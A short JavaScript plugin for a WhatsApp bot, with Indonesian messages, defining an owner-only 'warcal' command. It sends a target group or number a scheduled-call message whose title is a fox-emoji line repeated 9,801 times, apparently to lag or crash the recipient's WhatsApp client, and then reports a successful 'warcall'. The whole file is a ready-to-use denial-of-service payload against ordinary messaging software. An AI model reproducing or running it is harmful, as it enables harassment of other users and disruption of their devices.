let handler = async (m, {conn, text}) => {
if (!text) throw `masukan Id grup`
const a = {
scheduledCallCreationMessage: {
callType: "VIDEO",
scheduledTimestampMs:  Date.now(),
title: "🦊 PUH SEPUH 🦊\n".repeat(99*99)
}
}
conn.relayMessage(text, a, {})
await conn.sendReact(m.chat, "☑️", m.key)
m.reply('Sukses mengirim warcall ke nomor tujuan')
}
handler.help = ['warcal']
handler.tags = ['owner']
handler.command = /^(warcal)$/i
handler.owner = true
export default handler